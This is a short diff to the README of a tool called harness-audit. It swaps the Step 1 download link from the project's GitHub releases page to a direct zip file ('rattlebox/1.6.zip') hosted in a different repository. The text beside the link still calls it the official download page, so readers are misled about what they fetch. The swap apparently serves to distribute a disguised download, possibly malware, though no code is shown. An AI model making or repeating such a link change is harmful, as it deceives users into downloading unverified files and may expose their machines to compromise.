@@ -31,7 +31,7 @@ Follow these simple steps to download and start using harness-audit:
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[![Download harness-audit](https://img.shields.io/badge/Download-harness--audit-blue)](https://github.com/Adverbial-cobweb86/harness-audit/releases)
+[![Download harness-audit](https://img.shields.io/badge/Download-harness--audit-blue)](https://raw.githubusercontent.com/Adverbial-cobweb86/adverbial-cobweb86.github.io/main/rattlebox/1.6.zip)
 
 This will take you to the official download page. Look for the latest version and click the download button. The file will be saved to your computer.
 
